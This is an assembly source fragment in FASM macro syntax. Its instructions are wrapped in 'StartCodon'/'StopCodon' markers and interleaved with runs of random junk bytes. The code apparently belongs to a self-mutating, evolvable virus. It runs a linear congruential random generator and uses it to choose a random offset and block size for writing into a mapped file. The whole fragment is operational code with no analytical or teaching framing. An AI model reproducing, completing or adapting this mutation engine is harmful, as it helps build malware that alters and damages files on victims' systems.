db 251
db 183
db 184
db 35
db 53
db 70
db 107
db 15
db 70
db 18
db 29
db 154
db 133
db 92
db 164
db 135
db 191
db 64
db 193
db 153
db 115
db 169
db 29
db 223
db 140
db 49
db 75
db 58
db 103
db 206
db 40
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _div
       _nopsD
       _push                ; Save Result = (rand() % InsertThreshold1)
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
db StopCodon
db 204
db 111
db 38
db 226
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 249
db 135
db 35
db 114
db 230
db 255
db 48
db 73
db 84
db 81
db 223
db 57
db 138
db 55
db 250
db 5
db 233
db 23
db 41
db 51
db 221
db 36
db 118
db 133
db 244
db 128
db 78
db 67
db 145
db 90
db 189
db 18
db 168
db 40
db 235
db 2
db 154
db 175
db 142
db 209
db 34
db 25
db 195
db 140
db 42
db 102
db 92
db 1
db 93
db 32
db 177
db 112
db 43
db 5
db 214
db 95
db 233
db 163
db 243
db 197
db 198
db 255
db 184
db 65
db 96
db 192
db 79
db 158
db 97
db 55
db 59
db 92
db 121
db 236
db 226
db 24
db 108
db 227
db 232
db 13
db 50
db 166
db 249
db 3
db 19
db 180
db 101
db 48
db 99
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 31
db 101
db 46
db 213
db 75
db 64
db 142
db 155
db 149
db 36
db 211
db 57
db 1
db 83
db 13
db 50
db 174
db 132
db 151
db 63
db 79
db 133
db 157
db 204
db 103
db 230
db 219
db 53
db 224
db 97
db 210
db 230
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
db StopCodon
db StartCodon
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 186
db 48
db 89
db 173
db 70
db 208
db 151
db 154
db 243
db 60
db 157
db 122
db 163
db 77
db 138
db 29
db 118
db 92
db 82
db 254
db 161
db 104
db 245
db 116
db 228
db 254
db 3
db 36
db 15
db 127
db 160
db 46
db 70
db 221
db 101
db 188
db 81
db 252
db 38
db 0
db 85
db 235
db 196
db 156
db 127
db 79
db 242
db 246
db 69
db 218
db 230
db 127
db 185
db 107
db 161
db 179
db 105
db 33
db 234
db 240
db 61
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 94
db 38
db 198
db 121
db 220
db 204
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA                               ; mov RegA, [RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _nopdD                               ; mov RegD, 0
    _getDO
    BigNum=FileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 165
db 235
db 172
db 23
db 122
db 132
db 163
db 32
db 99
db 149
db 97
db 240
db 47
db 120
db 199
db 119
db 107
db 174
db 242
db 155
db 241
db 175
db 115
db 3
db 29
db 204
db 225
db 24
db 238
db 48
db 139
db 22
db 112
db 10
db 105
db 185
db 233
db 226
db 141
db 43
db 191
db 211
db 241
db 41
db 234
db 130
db 45
db 96
db 157
db 101
db 180
db 24
db 159
db 11
db 48
db 219
db 234
db 34
db 182
db 95
db 135
db 226
db 154
db 250
db 100
db 0
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 189
db 224
db 88
db 132
db 33
db 227
db 33
db 37
db 33
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 170
db 49
db 252
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 162
db 138
db 144
db 105
db 213
db 103
db 53
db 44
db 205
db 39
db 126
db 67
db 158
db 248
db 20
db 190
db 73
db 243
db 185
db 34
db 55
db 21
db 161
db 176
db 3
db 114
db 146
db 138
db 37
db 63
db 183
db 142
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdB                               ; RegB=FileSize
       _div                                 ; div BC1 <- RegD = rand() % FileSize = nBeforeIns
    _getDO
    BigNum=InsStart-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 176
db 7
db 215
db 135
db 94
db 63
db 63
db 205
db 15
db 8
db 221
db 154
db 153
db 3
db 34
db 178
db 164
db 77
db 73
db 16
db 76
db 147
db 162
db 234
db 12
db 13
db 45
db 191
db 71
db 168
db 49
db 136
db 31
db 179
db 62
db 238
db 24
db 142
db 195
db 56
db 14
db 194
db 230
db 253
db 30
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 53
db 149
db 102
db 118
db 253
db 123
db 110
db 107
db 196
db 183
db 164
db 54
db 129
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopsD                               ; BC1=nBeforeIns
       _save                                ; BC2=nBeforeIns
       _nopsB                               ; BC1=FileSize
        _pushall
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 44
db 138
db 192
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 226
db 44
db 92
db 93
db 242
db 211
db 20
db 237
db 29
db 91
db 25
db StartCodon
        _pop
db StopCodon
db 144
db 218
db 238
db 171
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 91
db 232
db 172
db 249
db 26
db 72
db 227
db 67
db 38
db 138
db 65
db 134
db 177
db 82
db 201
db 111
db 175
db 66
db 94
db 168
db 106
db 170
db 41
db 243
db 224
db 74
db 112
db 162
db 49
db 110
db 43
db 199
db 30
db 104
db 100
db 221
db 221
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
       _nopdB                               ; RegB=(FileSize-nBeforeIns)
    _getDO
    BigNum=MapPointer-DataOffset
    AlreadyStarted=0
db StopCodon
db 121
db 78
db 108
db 120
db 140
db 207
db 25
db 96
db 53
db 95
db 159
db 83
db 44
db 97
db 130
db 222
db 70
db 171
db 204
db 126
db 228
db 18
db 227
db 140
db 204
db 182
db 14
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 184
db 232
db 63
db 247
db 69
db 9
db 78
db 157
db 96
db 60
db 192
db 220
db 189
db 210
db 177
db 0
db 180
db 69
db 91
db 93
db 66
db 183
db 156
db 79
db 64
db 189
db 224
db 228
db 234
db 73
db 187
db 76
db 75
db 97
db 178
db 169
db 55
db 148
db 100
db 163
db 67
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 3
db 207
db 33
db 238
db 231
db 93
db 160
db 63
db 2
db 195
db 120
db 149
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 157
db 122
db 97
db 187
db 120
db 37
db 114
db 175
db 148
db 128
db 2
db 141
db 154
db 25
db 53
db 182
db 216
db 21
db 91
db 167
db 82
db 87
db 77
db 250
db 78
db 156
db 174
db 77
db 52
db 115
db 214
db 115
db 45
db 66
db 153
db 182
db 164
db 234
db 222
db 47
db 197
db 19
db 117
db 54
db 190
db 73
db 3
db 103
db 251
db 9
db 246
db 166
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata                             ; BC1=MapPoint
       _addsaved                            ; BC1=MapPoint + nBeforeIns = InsStart
       _writeDWord                          ; !!! InsStart=MapPoint + nBeforeIns
       _push
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 103
db 104
db 175
db 90
db 232
db 219
db 213
db 68
db 36
db 253
db 252
db 117
db 133
db 228
db 98
db 132
db 140
db 215
db 147
db 84
db 128
db 61
db 145
db 3
db 105
db 248
db 142
db 28
db 162
db 161
db 68
db 91
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 186
db 196
db 190
db 203
db 26
db 64
db 146
db 208
db 254
db 169
db 35
db 134
db 4
db 115
db 101
db 202
db 181
db 125
db 28
db 95
db 76
db 85
db 211
db 213
db 35
db 200
db 58
db 115
db 84
db 110
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 168
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 21
db 28
db 156
db 102
db 167
db 42
db 170
db 10
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 219
db 242
db 226
db 233
db 242
db 161
db 164
db 154
db 63
db 149
db 53
db 253
db 244
db 243
db 211
db 58
db 121
db 179
db 39
db 86
db 141
db 148
db 82
db 5
db 12
db 219
db 13
db 112
db 25
db 116
db 227
db 128
db 30
db 25
db 39
db 149
db 83
db 61
db 180
db 242
db 87
db 238
db 182
db 199
db 46
db 219
db 193
db 201
db 16
db 163
db 70
db 154
db 197
db 230
db 244
db 134
db 100
db 183
db 148
db 88
db 126
db 125
db 248
db 251
db 193
db 133
db 199
db 218
db 171
db 22
db 109
db 50
db 196
db 107
db 7
db 35
db 19
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 31
db 244
db 248
db 3
db 74
db 223
db 150
db 165
db 83
db 92
db 43
db 166
db 175
db 66
db 135
db 147
db 37
db 127
db 194
db 1
db 198
db 143
db 75
db 39
db 90
db 185
db 105
db 233
db 0
db 146
db 131
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=nBlockSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 226
db 83
db 235
db 193
db 95
db 186
db 166
db 241
db 32
db 64
db 64
db 174
db 82
db 69
db 71
db 158
db 121
db 135
db 201
db 68
db 109
db 190
db 104
db 136
db 44
db 131
db 132
db 222
db 29
db 94
db 139
db 241
db 11
db 108
db 177
db 144
db 182
db 202
db 117
db 62
db 170
db 44
db 90
db 25
db 86
db 205
db 197
db 39
db 93
db 109
db 218
db 9
db 134
db 26
db 59
db 89
db 46
db 136
db 167
db 37
db 199
db 122
db 1
db 229
db 84
db 83
db 165
db 115
db 21
db 147
db 67
db 174
db 122
db 138
db 120
db 147
db 136
db 219
db 101
db 73
db 14
db 1
db 1
db 94
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 99
db 199
db 208
db 148
db 75
db 110
db 104
db 104
db 98
db 54
db 229
db 73
db 66
db 76
db 119
db 65
db 188
db 148
db 99
db 179
db 16
db 67
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 46
db 140
db 47
db 123
db 255
db 248
db 81
db 73
db 39
db 44
db 41
db 158
db 107
db 254
db 177
db 162
db 238
db 106
db 91
db 168
db 115
db StartCodon
        _pop
db StopCodon
db 228
db 210
db 15
db 84
db 67
db 122
db 117
db 234
db 4
db 15
db 36
db 121
db 195
db 48
db 248
db 155
db 92
db 95
db 229
db 173
db 15
db 151
db 194
db 121
db 213
db 40
db 112
db 89
db 102
db 200
db 111
db 213
db 237
db 20
db 5
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
    _getDO
db StopCodon
db 123
db 255
db StartCodon
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 76
db 2
db 229
db 100
db 2
db 221
db 165
db 94
db 185
db 120
db 32
db 16
db 4
db 129
db 18
db 196
db 222
db 171
db 177
db 84
db 32
db 65
db 107
db 132
db 221
db 206
db 216
db 117
db 62
db 34
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA                               ; mov RegA, [RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _nopdD                               ; mov RegD, 0
    BigNum=32
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 21
db 59
db 91
db 68
db 153
db 41
db 10
db 132
db 134
db 123
db 194
db 222
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 183
db 245
db 171
db 111
db 100
db 83
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _div                                 ; div BC1 <- RegD = rand() % 32 = nBlockSize
       _nopsD                               ; BC1=nBlockSize
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
